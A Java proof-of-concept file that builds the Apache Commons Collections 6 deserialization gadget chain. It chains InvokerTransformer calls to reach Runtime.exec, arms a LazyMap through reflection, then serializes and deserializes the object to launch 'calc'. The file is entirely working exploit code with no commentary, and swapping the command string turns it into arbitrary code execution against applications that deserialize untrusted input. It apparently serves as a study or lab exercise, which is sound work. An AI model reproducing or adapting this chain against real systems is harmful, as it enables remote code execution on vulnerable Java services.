package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class FinalCC6EXP {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<Object,Object>();
        Map<Object,Object> lazymap = LazyMap.decorate(map,new ConstantTransformer(1));

        HashMap<Object,Object> map2 = new HashMap<>();

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"aaa");

        map2.put(tiedMapEntry,"bbb");
        map.remove("aaa");

        Class c = LazyMap.class;
        Field fieldfactory = c.getDeclaredField("factory");
        fieldfactory.setAccessible(true);
        fieldfactory.set(lazymap,chainedTransformer);
        serialize(map2);
        unserialize("ser.bin");

    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
        }

}